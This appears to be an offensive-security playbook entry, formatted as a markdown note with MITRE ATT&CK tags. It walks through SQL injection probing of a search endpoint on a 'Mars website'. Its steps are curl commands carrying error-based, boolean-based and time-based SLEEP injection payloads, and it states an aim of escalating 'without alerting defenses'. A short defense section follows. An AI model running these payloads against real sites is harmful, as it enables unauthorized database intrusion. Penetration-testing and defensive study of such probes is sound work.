---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
name: Test-SQL-Injection-in-Search
tags:
  - sqli
  - testing
  - web
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.794Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SQL-Injection-in-Search

## Summary

This procedure tests the search functionality of the Mars website for SQL injection vulnerabilities by sending crafted payloads to detect insufficient input validation, confirming if malicious SQL code can be injected.

## Description

In the context of the Mars website, the search feature processes user input directly into SQL queries without proper sanitization or parameterization, allowing attackers to append or modify SQL statements. This procedure involves sending probe payloads via HTTP requests to elicit database errors or behavioral changes, identifying the vulnerability type (e.g., error-based, blind, union-based). Prerequisites include public access to the website and basic HTTP client tools. Expected outcomes are confirmation of injectability, potentially revealing database details for further exploitation.

## Requirements

1. Network access to the Mars website
2. HTTP client like curl or browser developer tools
3. Knowledge of common SQL payloads

## Defense

Defensive measures and detection strategies:

- Implement prepared statements and parameterized queries in backend code
- Use web application firewalls (WAF) to block suspicious input patterns
- Monitor application logs for SQL error messages or anomalous query patterns

## Objectives

1. Confirm SQL injection vulnerability in search input
2. Determine database type and injection method
3. Gather initial insights for escalation without alerting defenses

## Instructions

### Step 1: Send Basic Injection Probe

**Context**: Probe the search endpoint with a single quote to trigger syntax errors if input is unsanitized.

**Command** ([[commands/curl-send-payload]]):
```bash
curl -X GET "https://mars-website.com/search?q=test'" -v
```

> This command sends a search query with a trailing single quote, expecting an SQL syntax error in the response if vulnerable. Look for errors like "You have an error in your SQL syntax" indicating MySQL or similar.

### Step 2: Test Boolean-Based Injection

**Context**: Use a conditional payload to verify blind SQLi where no errors are shown but logic alters responses.

**Command** ([[commands/curl-send-payload]]):
```bash
curl -X GET "https://mars-website.com/search?q=1' AND 1=1--" -v
curl -X GET "https://mars-website.com/search?q=1' AND 1=2--" -v
```

> The first command should return normal results (true condition), while the second returns none (false), confirming injection without errors.

### Step 3: Time-Based Confirmation

**Context**: Employ a sleep function to detect delays, useful for blind injections.

**Command** ([[commands/curl-send-payload]]):
```bash
curl -X GET "https://mars-website.com/search?q=1' AND IF(1=1, SLEEP(5), 0)--" -w "%{time_total}\n"
```

> A 5-second delay in response time confirms the payload execution in the database.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-payload]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- [[sqli]]
- [[web]]
- [[injection]]
